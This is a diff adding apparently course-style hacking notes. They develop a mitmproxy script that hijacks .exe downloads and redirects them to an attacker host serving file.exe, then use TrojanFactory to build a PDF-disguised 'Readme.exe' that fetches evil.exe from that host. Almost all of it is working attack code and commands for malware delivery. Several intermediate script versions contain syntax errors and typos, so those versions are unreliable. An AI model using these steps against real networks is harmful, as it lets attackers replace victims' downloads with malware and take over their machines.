@@ -348,4 +348,78 @@ def request(flow):
     print(flow.request)
 
 
-4) 
+4) ./mitmdump -s /root/basic.py
+
+v-68)
+
+5) 
+
+import mitmproxy
+
+def request(flow):
+   print("[+] This is a request flow")
+   print(flow.request.pretty_url)
+
+6) ./mitmdump -s /root/basic.py
+
+7) 
+
+import mitmproxy
+
+def request(flow):
+    if flow.request.pretty_url.endswith(".exe")
+        print("[+] Got interesting flow")
+        print(flow)
+
+v-69)
+
+8)
+
+import mitmproxy
+
+def request(flow):
+   if flow.request.pretty_url.endswith(".exe")
+       print("[+] Got interseting flow")
+       mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.20.215.8/file.exe"})
+
+
+v-70)
+
+9) 
+
+import mitmproxy
+
+def request(flow):
+    if flow.request.pretty_url.endswith(".exe")
+       print("[+] Got interesting flow")
+       flow.reponse = mitmproxy.http.HTTPResponse.make(301,"",{"Location":"http://10.20.215.8/file.exe"})
+
+
+10) 
+
+import mitmproxy
+
+def request(flow):
+   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
+       print("Got interesting flow")
+       flow.response = mitmproxy.http.HTTPResponse.make(301,"",{"Location":"http://10.20.215.8/file.exe"})
+
+
+
+11) wine autoit-v3-setup.exe
+
+12) cd /opt
+
+13) git clone https://github.com/TrojanFactory.git
+
+14) cd TrojanFactory/
+
+15) python trojan_factory.py --help
+
+v-72)
+
+16) python trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico         
+
+17) python trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico  -z
+  
+
